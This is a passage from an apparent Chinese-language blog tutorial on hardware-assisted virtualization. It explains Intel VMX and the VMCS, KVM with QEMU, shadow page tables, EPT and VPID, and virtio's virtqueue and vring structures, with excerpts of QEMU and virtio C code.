class="hljs-type">uint32_t</span> vmx_abort_indicator;<br>    <br>    <span class="hljs-comment">/* 数据域 */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VMCSData</span> <span class="hljs-title">vmcs_data</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>VMCS 数据域 存放着 VMCS 主要的信息，分为以下六个子域：</p><ul><li><p><strong>Guest-state area</strong>：保存 VM 寄存器状态，在 VM-entry 时加载，在 VM-exit 时保存</p></li><li><p><strong>Host-state area</strong>：保存 Hypervisor 寄存器状态，在 VM-exit 时加载</p><p><img src="https://s2.loli.net/2022/08/15/C8wMpWE5X7S1KYP.png" alt="image.png"></p></li><li><p><strong>VM-execution control fileds</strong>：控制 <code>Non-Root</code> 模式下的处理器行为 </p></li><li><p><strong>VM-entry  control fileds</strong>：控制 <code>VM-Entry</code> 过程中的某些行为</p></li><li><p><strong>VM-exit  control fileds</strong>：控制 <code>VM-Exit</code> 过程中的某些行为</p></li><li><p><strong>VM-exit information fields</strong>：保存 <code>VM-Exit</code> 的基本原因及其他详细信息，在一些处理器上该域为只读域</p><p><img src="https://s2.loli.net/2022/08/15/jqQDsA6UHZ7wy8z.png" alt="image.png"></p></li></ul><p>我们通过以下两条指令读写 VMCS：</p><table><thead><tr><th align="center">Instruction</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">VMREAD &lt;索引&gt;</td><td align="center">读 VMCS 中“索引”指定的域</td></tr><tr><td align="center">VMWRITE &lt;索引&gt; &lt;数据&gt;</td><td align="center">向 VMCS 中“索引”指定的域写入数据</td></tr></tbody></table><blockquote><p>这里的索引并非偏移值，而是 Intel 为数据域中每个字段都定义了一个独特的索引值，例如 Guest State Area 中 ES 段选择子的索引值便是 <code>0x00000800</code></p><p>当然，要把所有域的索引都背下来并不现实，最好的办法还是多多查表：）推荐阅读：<a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a> 的 <a href="https://cdrdv2.intel.com/v1/dl/getContent/671506">Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 3C: System Programming Guide, Part 3</a></p></blockquote><h3 id="III-VMX-操作模式"><a href="#III-VMX-操作模式" class="headerlink" title="III. VMX 操作模式"></a>III. VMX 操作模式</h3><p>作为传统的 IA32 架构的扩展，VMX 操作模式在默认下是关闭的，只有当 VMM 需要使用硬件辅助虚拟化功能时才会使用 Intel 提供的两条新指令来开关 VMX 操作模式：</p><ul><li><code>VMXON</code>：开启 VMX 操作模式</li><li><code>VMXOFF</code>：关闭 VMX 操作模式</li></ul><p>在 Intel SDM 中描述的 VMX 生命周期如下：</p><ul><li>软件通过 <code>VMXON</code> 指令进入 VMX 操作模式</li><li>VMM 可以通过 <code>VM entries</code> 进入 Guest VM（单次只能执行一个 VM），VMM 通过 <code>VMLAUNCH</code> （第一次进入 VM）与 <code>VMRESUME</code> （从 VMM 中恢复到 VM）指令来使能 <code>VM entry</code>，通过 <code>VM exits</code> 重获控制权</li><li><code>VM exits</code> 通过 VMM 指定的入口点移交控制权，VMM 对 VM 的退出原因进行响应后通过 <code>VM entry</code> 返回到 VM 中</li><li>当 VMM 想要停止自身运行并退出 VMX 操作模式时，其通过 <code>VMXOFF</code> 指令来完成</li></ul><p><img src="https://s2.loli.net/2022/09/05/FXCzMI3N4JafQRe.png" alt="image.png"></p><p>现在我们来深入 <code>VM entry</code> 与 <code>VM exit</code> 这两个行为的实现细节中，在其流程中他们分别进行了如下动作：</p><ul><li><strong>VM entry</strong>：从 Hypervisor 切换到 VM<ul><li>检查 VMCS 合法性（各字段值是否合法）</li><li>加载 VMCS 的 <code>Guest-state area</code> 中的各字段到对应的寄存器</li><li>加载指定的 MSR</li><li>设置 VMCS 的状态为 <code>launched</code></li><li>根据需要通过写 VMCS 的 <code>VM-entry Interrucption-Information</code> 向 VM 进行<strong>事件注入</strong>（如异常、异步中断等）</li></ul></li><li><strong>VM exit</strong>：从 VM 切换到 Hypervisor<ul><li>将 VM 退出的原因与详细信息写入 VMCS 的  <code>VM-exit information fields</code></li><li>将 VM 的寄存器保存至 VMCS 的 <code>Guest-state area</code> </li><li>从 VMCS 的 <code>Host-state area</code> 中恢复 Host 寄存器</li><li>加载指定 MSR</li></ul></li></ul><p><img src="https://s2.loli.net/2022/08/11/vzj8dDtgLk2JI6Q.png" alt="image.png"></p><blockquote><p>这里笔者为大家补充一个概念：<strong>Model Specific Register</strong>，简称 MSR，是 x86 下的一组用来<strong>控制CPU运行、功能开关、调试、跟踪程序执行、监测CPU性能</strong>等方面的寄存器</p><blockquote><p>例如 <code>syscall</code> 指令便是通过 MSR 寄存器来获取到内核系统调用的入口点</p></blockquote><p>每个 MSR 寄存器都会有一个 id，称之为 <code>MSR Index</code>，我们可以通过这个 id 来利用 <code>RDMSR</code> 与 <code>WRMSR</code> 指令读写指定的 MSR 寄存器</p><p>我们可以在 Intel SDM 的 Volume 4 中获取到到 MSR 寄存器的详细信息</p></blockquote><h2 id="三、KVM-amp-QEMU-KVM"><a href="#三、KVM-amp-QEMU-KVM" class="headerlink" title="三、KVM &amp; QEMU-KVM"></a>三、KVM &amp; QEMU-KVM</h2><p>下面我们来介绍 KVM——<strong>Kernel-based Virtual Machine</strong>，是一个自 Linux 2.6.20 后集成在 kernel 中的一个<strong>开源系统虚拟化内核模块</strong>，本质上是一个依赖于硬件辅助虚拟化的位于 kernel 中的 Hypervisor，或者说<strong>KVM 将 Linux kernel 变成了 Hypervisor</strong>，并提供了相应的用户态操作 VM 的接口： <code>/dev/kvm</code> ，我们可以通过 ioctl 指令来操作 KVM</p><p>但 KVM 本身仅提供了 CPU 与内存的虚拟化，不能构成一个完整的虚拟化环境，那么我们不难想到的是我们可以复用现有的全虚拟化方案，<strong>将模拟 CPU 与内存的工作交由 KVM 完成</strong>，这样便能直接通过 KVM 来借助硬件辅助虚拟化以提高虚拟机性能</p><p>那么我们有这样的一个现成的完备的全虚拟化实现方案吗？答案是有的——<strong>QEMU</strong> 本身便<strong>完整模拟了一整套虚拟机环境</strong>，我们不难想到的是我们可以修改 QEMU 的代码，使其通过 KVM 来创建与运行虚拟机，而设备模拟等依旧复用原有的框架，<strong>这样我们就实现了一个高性能的全虚拟化平台：KVM + QEMU</strong></p><p><img src="https://s2.loli.net/2022/08/29/7WByzSrM9QYPsKH.png" alt="image.png"></p><p>利用QEMU + KVM 进行虚拟化的方案如下：</p><ul><li>QEMU 通过 ioctl 进入内核态将控制权移交 KVM，KVM 进行 VM 的运行</li><li>产生 VM-Exit，KVM 接管，判断原因并决定继续运行还是交由 QEMU 处理</li><li>若是后者，恢复到用户态 QEMU 中的处理代码进行相应的处理，之后退出或回到第一步</li></ul><p><img src="https://s2.loli.net/2022/08/05/GUxVBYWnbdzA6KD.png" alt="image.png"></p><p>这个基本执行框架实际上为 QEMU 源码 <code>accel/kvm/kvm-all.c</code> 中的 <code>kvm_cpu_exec()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">kvm_cpu_exec</span><span class="hljs-params">(CPUState *cpu)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    cpu_exec_start(cpu);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 开始运行 VM，本质上就是 ioctl(kvm_fd, KVM_RUN)</span><br><span class="hljs-comment">         * 当产生 VM-Exit 时，首先在 KVM 中完成处理，</span><br><span class="hljs-comment">         * 若产生 IO，则退出内核态，即恢复到这里，接下来进入到用户态的处理</span><br><span class="hljs-comment">         */</span><br>        run_ret = kvm_vcpu_ioctl(cpu, KVM_RUN, <span class="hljs-number">0</span>);<br>        <br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">if</span> (run_ret &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 返回值小于 0 说明 VM 运行出了些问题，</span><br><span class="hljs-comment">             * 这里会简单处理后 break 打破大循环 </span><br><span class="hljs-comment">             */</span><br>        <span class="hljs-comment">//...</span><br>        &#125;<br>        <br>        trace_kvm_run_exit(cpu-&gt;cpu_index, run-&gt;exit_reason);<br>        <span class="hljs-comment">/* 这里就是一个大的 switch，根据退出的原因进行不同的处理，就不放完整代码了 */</span><br>        <span class="hljs-keyword">switch</span> (run-&gt;exit_reason) &#123;<br>        <span class="hljs-keyword">case</span> KVM_EXIT_IO:<br>            DPRINTF(<span class="hljs-string">&quot;handle_io\n&quot;</span>);<br>            <span class="hljs-comment">/* Called outside BQL */</span><br>            kvm_handle_io(run-&gt;io.port, attrs,<br>                          (<span class="hljs-type">uint8_t</span> *)run + run-&gt;io.data_offset,<br>                          run-&gt;io.direction,<br>                          run-&gt;io.size,<br>                          run-&gt;io.count);<br>            ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> KVM_EXIT_MMIO:<br>            DPRINTF(<span class="hljs-string">&quot;handle_mmio\n&quot;</span>);<br>            <span class="hljs-comment">/* Called outside BQL */</span><br>            address_space_rw(&amp;address_space_memory,<br>                             run-&gt;mmio.phys_addr, attrs,<br>                             run-&gt;mmio.data,<br>                             run-&gt;mmio.len,<br>                             run-&gt;mmio.is_write);<br>            ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">default</span>:<br>            DPRINTF(<span class="hljs-string">&quot;kvm_arch_handle_exit\n&quot;</span>);<br>            ret = kvm_arch_handle_exit(cpu, run);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (ret == <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">/* 运行结束，收尾处理 */</span><br>    <span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><h1 id="0x04-中断虚拟化"><a href="#0x04-中断虚拟化" class="headerlink" title="0x04.中断虚拟化"></a>0x04.中断虚拟化</h1><p><strong>中断</strong>（Interrupt）机制是一种用来通知 CPU 发生了需要处理的事件的机制，按照发生的位置分为外部中断（来自外部的中断，INTR 引脚传来的为可屏蔽中断，NMI 引脚传来的为不可屏蔽中断）与内部中断（软中断、异常、陷阱等），实模式下 CPU 根据中断向量表来寻找对应的处理程序，保护模式下则通过中断描述符表来寻找处理程序</p><p>现代 X86 处理器使用的中断控制器称之为 <strong>APIC</strong>(Advanced Programmable Interrupt Controller)，所有的核心共用一个 I&#x2F;O APIC ，用于接收外部中断，同时每个核独立有着一个 <strong>Local APIC</strong>，用于接收来自 I&#x2F;O APIC 的中断信息、内部时钟中断、来自其他核心的中断（<strong>Inter-Processor Interrupt</strong>，IPI）等</p><p><img src="https://s2.loli.net/2022/08/29/BWGZpyebmVXCcLJ.png" alt="image.png"></p><p>在虚拟化环境当中，每个 vCPU 都对应需要有一个 virtual LAPIC，所有的核心则需要共享一个 virtual I&#x2F;O APIC，这都是需要 Hypervisor 进行模拟与维护的</p><h2 id="一、基本模型-1"><a href="#一、基本模型-1" class="headerlink" title="一、基本模型"></a>一、基本模型</h2><h1 id="0x05-内存虚拟化"><a href="#0x05-内存虚拟化" class="headerlink" title="0x05. 内存虚拟化"></a>0x05. 内存虚拟化</h1><p>内存虚拟化本质上是需要达成以下两个目的：</p><ul><li>提供一个在 Guest 感知中的从零开始的连续物理内存空间</li><li>在各个 VM 之间进行有效的隔离、调度、共享内存资源</li></ul><h2 id="一、纯软件实现虚拟化-1"><a href="#一、纯软件实现虚拟化-1" class="headerlink" title="一、纯软件实现虚拟化"></a>一、纯软件实现虚拟化</h2><h3 id="I-虚拟机内存访问原理及遇到的问题"><a href="#I-虚拟机内存访问原理及遇到的问题" class="headerlink" title="I.虚拟机内存访问原理及遇到的问题"></a>I.虚拟机内存访问原理及遇到的问题</h3><p>为了实现内存空间的隔离，Hypervisor 需要为 Guest VM 准备一层新的地址空间：<code>Guest Physical Address Space</code>，从 Guest 侧其只能看到这一层地址空间，Hypervisor 需要记录从 GPA 到 HVA 之间的转换关系</p><p>下图为 Qemu 的内存架构：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">Guest&#x27; processes<br>                     +--------------------+<br>Virtual addr space   |<span class="hljs-string">                    </span>|<br>                     +--------------------+                                    （GVA）<br>                     |<span class="hljs-string">                    </span>|<br>                     \__   Page Table     \__<br>                        \                    \<br>                         |<span class="hljs-string">                    </span>|<span class="hljs-string">  Guest kernel</span><br><span class="hljs-string">                    +----+--------------------+----------------+</span><br><span class="hljs-string">Guest&#x27;s phy  memory </span>|<span class="hljs-string">    </span>|<span class="hljs-string">                    </span>|<span class="hljs-string">                </span>|<span class="hljs-string">            （GPA）</span><br><span class="hljs-string">                    +----+--------------------+----------------+</span><br><span class="hljs-string">                    </span>|<span class="hljs-string">                                          </span>|<br>                    \__                                        \__<br>                       \                                          \<br>                        |<span class="hljs-string">             QEMU process                 </span>|<br>                   +----+------------------------------------------+<br>Virtual addr space |<span class="hljs-string">    </span>|<span class="hljs-string">                                          </span>|<span class="hljs-string">         （HVA）</span><br><span class="hljs-string">                   +----+------------------------------------------+</span><br><span class="hljs-string">                   </span>|<span class="hljs-string">                                               </span>|<br>                    \__                Page Table                   \__<br>                       \                                               \<br>                        |<span class="hljs-string">                                               </span>|<br>                   +----+-----------------------------------------------+----+<br>Physical memory    |<span class="hljs-string">    </span>|<span class="hljs-string">                                               </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    （HPA）</span><br><span class="hljs-string">                   +----+-----------------------------------------------+----+</span><br></code></pre></td></tr></table></figure><p>当我们要访问 Guest 中某个虚拟地址上的数据时，我们需要：</p><ul><li>首先得先通过 Guest 的页表将 <code>Guest Virtual Address</code> （GVA）转换为 <code>Guest Physical Address</code>（GPA）</li><li>GPA 在 Qemu 的实现当中实际上是对应映射到 Host 中一大块 mmap 的内存上的，所以我们还需要将 GPA 再转换为 <code>Host Virtual Address</code>（HVA）</li><li>最后再通过 Host 上的页表将 HVA 转化为 <code>Host Physical Address</code>（HPA）</li><li>在 Guest 多级页表的寻址当中同样也要多次经过 <code>GPA-&gt;HPA</code> 的转换查询过程</li></ul><p>这一整套流程<strong>非常繁重</strong>，从而使得虚拟机中内存访问的性能极为低下</p><blockquote><p>在 QEMU 当中访问内存的核心函数是 <code>address_space_rw()</code>，感兴趣的同学可以看一下其内部实现，虽然说只是 GPA-&gt;HVA（笑）</p></blockquote><h3 id="II-影子页表-（shadow-page-table）"><a href="#II-影子页表-（shadow-page-table）" class="headerlink" title="II.影子页表 （shadow page table）"></a>II.影子页表 （shadow page table）</h3><p>在早期的时候 Intel 硬件对虚拟化并没有很好的支持，因此 Hypervisor 只能先在软件层面进行优化——<strong>影子页表</strong>（Shadow Page Table）应运而生</p><p>以 Intel 为例，由于读写 CR3 寄存器（存放页顶级表指针）的操作是敏感指令，我们的 Hypervisor 可以很轻易地截获 VM 的这个操作，<strong>并将页表替换为存放 GVA→HPA 映射关系的影子页表</strong>，这样就能<strong>直接完成由 GVA 到 HPA 的转换过程</strong></p><p><img src="https://s2.loli.net/2022/08/05/eG1hpBbZy6Edszg.png" alt="image.png"></p><p>为了实现影子页表，我们本质上需要实现<strong>MMU 虚拟化</strong>：</p><ul><li>Guest VM 所能看到与操作的实际都上是虚拟的 MMU，真正载入 MMU 的页表是由 Hypevisor 完成翻译后所产生的<strong>影子页表</strong></li><li>影子页表中的访问权限为<strong>只读的</strong>，当 Guest 想要读写页表时便能被 Hypervisor 捕获到这个操作并代为处理</li></ul><p>不过这种方法的缺点就是<strong>我们需要为 Guest VM 中的每套页表都独立维护一份影子页表，且需要多次在 VMM 与 VM 间进行切换，这具有一定的开销</strong></p><h2 id="二、硬件辅助虚拟化"><a href="#二、硬件辅助虚拟化" class="headerlink" title="二、硬件辅助虚拟化"></a>二、硬件辅助虚拟化</h2><h3 id="III-扩展页表（Extend-Page-Table-EPT）"><a href="#III-扩展页表（Extend-Page-Table-EPT）" class="headerlink" title="III.扩展页表（Extend Page Table, EPT）"></a>III.扩展页表（Extend Page Table, EPT）</h3><p>从软件层面似乎已经是难以有更好的优化的方案了，因此硬件层面的对内存虚拟化的支持便应运而生——<strong>EPT</strong> 即 <strong>Extend Page Table</strong>，是 Intel 为实现内存虚拟化而新增的特性，目的是为了减少内存访问的开销</p><p>EPT 并不干扰 Guest VM 操作自身页表的过程，其本质上是<strong>额外提供了一个 Guest 物理地址空间到 Host 物理地址空间转换的页表</strong>，即使用一个额外的页表来完成 <code>GPA→HPA</code> 的转换</p><p>EPT 方案虽然相比起影子页表而言多了一层转换，但是并不需要干扰 Guest 原有的页表管理，<strong>GVA→GPA→HPA 的过程都由硬件自动完成</strong>，同时 Hypervisor 仅需要截获 <code>EPT Violation</code> 异常（EPT 表项为空），效率提高了不少</p><p><img src="https://s2.loli.net/2022/08/05/BSjJk3zq6ayrXvO.png" alt="image.png"></p><h3 id="IV-VPID：TLB-资源优化"><a href="#IV-VPID：TLB-资源优化" class="headerlink" title="IV. VPID：TLB 资源优化"></a>IV. VPID：TLB 资源优化</h3><p><strong>Translation Lookaside Buffer</strong>为用以加快虚拟地址到物理地址转换的<strong>页表项缓存</strong>，当进行地址转换时 CPU 首先会先查询 TLB，TLB 根据虚拟地址查找是否存在对应的 cache，若 cache miss 了才会查询页表</p><p>由于 TLB 是与对应的页表进行工作的，因此在切换页表时 TLB 原有的内容就失效了，此时我们应当使用 <code>INVLPG</code> 使 TLB 失效，类似地，在 VM-Entry 与 VM-Exit 时 CPU 都会强制让 TLB 失效，但这么做仍存在一定的性能损耗</p><p><strong>Virtual Processor Identifier</strong>（VPID）则是一种硬件级的对 TLB 资源管理的优化，其在硬件上为每个 TLB 表项打上一个 VPID 标识（VMM 为每个 vCPU 分配一个唯一的 VPID，存放在 VMCS 中，逻辑 CPU 的 VPID 为 0），在 CPU 查找 TLB cache 时会先比对 VPID，这样我们就无需在每次进行 VM entry&#x2F;exit 时刷掉所有的 cache，而可以继续复用之前保留的 cache</p><h1 id="0x06-I-x2F-O-虚拟化"><a href="#0x06-I-x2F-O-虚拟化" class="headerlink" title="0x06. I&#x2F;O 虚拟化"></a>0x06. I&#x2F;O 虚拟化</h1><p>现实的外设资源往往是有限的，同时我们有的时候并不需要让 VM 直接接触到现实存在的外设资源，有的时候我们还想为 VM 提供一些不存在实体设备的设备，因此 Hypervisor 需要通过 IO 虚拟化的方式来为 VM 提供<strong>虚拟的设备资源</strong></p><p>从处理器的角度而言，我们与外设之间的交互主要是通过 <code>MMIO</code> 与 <code>Port IO</code> 来完成的，因而针对外设的虚拟化称之为 <strong>I&#x2F;O 虚拟化</strong></p><p>I&#x2F;O 虚拟化需要实现以下三个任务：</p><ul><li>访问截获：Hypervisor 需要截获 VM 对外设的访问操作</li><li>提供设备接口：Hypervisor 需要为 VM 提供虚拟&#x2F;直通设备的接口</li><li>实现设备功能：Hypervisor 需要实现虚拟设备的功能</li></ul><h2 id="一、I-x2F-O-虚拟化基本模型"><a href="#一、I-x2F-O-虚拟化基本模型" class="headerlink" title="一、I&#x2F;O 虚拟化基本模型"></a>一、I&#x2F;O 虚拟化基本模型</h2><blockquote><p>这一节其实是笔者不记得不知道什么时候出于什么目的从<a href="https://developer.ibm.com/tutorials/l-pci-passthrough/">https://developer.ibm.com/tutorials/l-pci-passthrough/</a>上翻译了一段存在草稿箱里，最近翻草稿箱发现之前居然还留存有这种东西，所以修改一下就放上来了XD</p></blockquote><h3 id="I-平台设备模拟（Platform-device-emulation）"><a href="#I-平台设备模拟（Platform-device-emulation）" class="headerlink" title="I.平台设备模拟（Platform device emulation）"></a>I.平台设备模拟（Platform device emulation）</h3><p>QEMU 和 VMWare 都选择了仿真出一个虚拟设备，不同在于其模拟设备的实现方式。</p><h4 id="基于虚拟机管理程序的设备模拟（Hypervisor-based-device-emulation）"><a href="#基于虚拟机管理程序的设备模拟（Hypervisor-based-device-emulation）" class="headerlink" title="基于虚拟机管理程序的设备模拟（Hypervisor-based device emulation）"></a>基于虚拟机管理程序的设备模拟（Hypervisor-based device emulation）</h4><p>在 hypervisor （虚拟机管理程序）中对设备进行仿真是 VMware workstation 系列产品较为常用的一种方式：在 hypervisor 中有着对一般设备的仿真供 guest OS 进行共享，包括虚拟磁盘、虚拟网络适配器与其他的必要元素，这种模型如下图所示：</p><p><img src="https://s2.loli.net/2022/02/25/IQduvSe7wE4TLgq.png" alt="image.png"></p><h4 id="在用户空间进行设备模拟（User-space-device-emulation）"><a href="#在用户空间进行设备模拟（User-space-device-emulation）" class="headerlink" title="在用户空间进行设备模拟（User space device emulation）"></a>在用户空间进行设备模拟（User space device emulation）</h4><p>第二种架构称为用户空间设备模拟，正如其名，相比于在 hypervisor 中进行模拟，其选择了在用户空间进行模拟的方式。QEMU（不仅提供了设备模拟同时还有一个 hypervisor）在用户空间中独立模拟了一个设备，该模拟设备被其他的 VM 通过 hypervisor 提供的接口进行调用。由于设备的模拟是独立于 hypervisor 的，因此我们可以模拟任何设备，且该模拟设备可以在其他 hypervisor 间进行共享。</p><p><img src="https://s2.loli.net/2022/02/28/IQbMNCcDlXR4z5V.png" alt="image.png"></p><h3 id="II-设备直通（Device-passthrough）"><a href="#II-设备直通（Device-passthrough）" class="headerlink" title="II.设备直通（Device passthrough）"></a>II.设备直通（Device passthrough）</h3><p>上面的这两种模型或多或少都存在着一定的性能开销，如果该设备需要被多个 VM 共享，那这种开销或许是值得的，但如果该设备并不需要共享，那么我们其实可以使用一种更为高效的方法——设备直通（Device passthrough）。</p><h4 id="通过虚拟机管理程序进行直通（Passthrough-within-the-hypervisor）"><a href="#通过虚拟机管理程序进行直通（Passthrough-within-the-hypervisor）" class="headerlink" title="通过虚拟机管理程序进行直通（Passthrough within the hypervisor）"></a>通过虚拟机管理程序进行直通（Passthrough within the hypervisor）</h4><p>设备直通可以理解为设备独占的设备模拟：直接将设备<strong>隔离</strong>给到指定的 VM 上，以便该设备可以由该 VM 独占使用。<strong>这提供了接近于原生设备的性能</strong>，例如对于一些需要大量 IO 的设备（例如网络设备等），使用设备直通能提供相当完美的性能。</p><p>下图左半部分便为设备直通</p><p><img src="https://s2.loli.net/2022/02/28/PRSNK1g4saEjvVF.png" alt="image.png"></p><h2 id="二、软件半虚拟化-virtio"><a href="#二、软件半虚拟化-virtio" class="headerlink" title="二、软件半虚拟化 - virtio"></a>二、软件半虚拟化 - virtio</h2><p><code>virtio</code> 这个概念来自于一篇非常古老的虚拟化领域的论文：<a href="https://ozlabs.org/~rusty/virtio-spec/virtio-paper.pdf">virtio: towards a de-facto standard for virtual I&#x2F;O devices</a>，主要是为了解决设备虚拟化的问题而<strong>提供了一套通用的虚拟化设备模型</strong>，Guest OS 只需要实现一套统一的 virtio 驱动便能以统一的方式访问虚拟化设备，从而避免了各种虚拟化驱动分裂的问题</p><p><img src="https://s2.loli.net/2022/08/29/SZ2p17EtqRHoFQh.png" alt="image.png"></p><h3 id="I-VirtQueue：传输层抽象"><a href="#I-VirtQueue：传输层抽象" class="headerlink" title="I. VirtQueue：传输层抽象"></a>I. VirtQueue：传输层抽象</h3><p><code>virtqueue</code> 为 virtio 中用以进行数据传输的关键结构，其本身表示一个<strong>数据队列</strong>：由一方向队列中添加 buffer，另一方从队列中取出 buffer——通过这样的方式实现了 Guest 与 Host 之间基本的数据传输模型</p><p>为了减少模型的复杂性，通常我们使用 virtqueue 的传输都是单向的，因此一个最简单的模型就是我们就可以使用两个 virtqueue 来实现 Guest 与 Host 之间的双向通信：tx queue（发送队列） &amp; rx queue（接收队列）</p><p><img src="https://s2.loli.net/2022/08/29/g1kn2r4VWO7GBLM.png" alt="转自 LoyenWang 公众号的图片，非常清晰的表示了 virtqueue 工作原理的一张图！"></p><p>对于 virtqueue 的操作，在论文中抽象成一个函数表 <code>virtqueue_ops</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue_ops</span> &#123;</span><br>    <span class="hljs-type">int</span> (*add_buf)(<span class="hljs-keyword">struct</span> virtqueue *vq,<br>                    <span class="hljs-keyword">struct</span> scatterlist sg[],<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> out_num,<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> in_num,<br>                    <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> (*kick)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>    <span class="hljs-type">void</span> *(*get_buf)(<span class="hljs-keyword">struct</span> virtqueue *vq,<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *len);<br>    <span class="hljs-type">void</span> (*disable_cb)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>    <span class="hljs-type">bool</span> (*enable_cb)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>add_buf</code>：向 virtqueue 中添加一个 buffer</li><li><code>kick</code> ：通知另一方新到达了一个 buffer</li><li><code>get_buf</code> 从 virtqueue 中获取一个 buffer</li><li><code>disable_cb</code>：通知另一方关闭 buffer 到达的提示</li><li><code>enable_cb</code>：通知另一方开启 buffer 到达的提示</li></ul><h3 id="II-VRing：virtqueue-的基本结构"><a href="#II-VRing：virtqueue-的基本结构" class="headerlink" title="II. VRing：virtqueue 的基本结构"></a>II. VRing：virtqueue 的基本结构</h3><p>virtqueue 核心的数据结构便是 <code>vring</code>，这是一个<strong>环形缓冲区队列</strong>，其由三部分组成：</p><ul><li>描述符表（Desc）</li><li>可用描述符数组（Used）</li><li>已用描述符数组（Avail）</li></ul><p><img src="https://s2.loli.net/2022/08/29/OrlAvYaFkZ3dIXt.png" alt="image.png"></p><p>一个描述符（Descriptor）为如下结构，表示了一块 buffer 的基本属性，需要注意的是一个 Avail&#x2F;Used 表项通常是多个 descriptor 串联的 buffer——这便是 next 域的作用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_desc</span></span><br><span class="hljs-class">&#123;</span><br>    __u64 addr;<span class="hljs-comment">// Guest Physical Addresses</span><br>    __u32 len;<span class="hljs-comment">// 长度</span><br>    __u16 flags;<span class="hljs-comment">// 属性</span><br>    __u16 next;<span class="hljs-comment">// 下一个描述符的 idx</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Avail</strong> 数组用来存储当前可用的描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_avail</span></span><br><span class="hljs-class">&#123;</span><br>    __u16 flags;<br>    __u16 idx;<br>    __u16 ring[NUM];<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Used</strong> 数组则用来存储已经被使用的描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 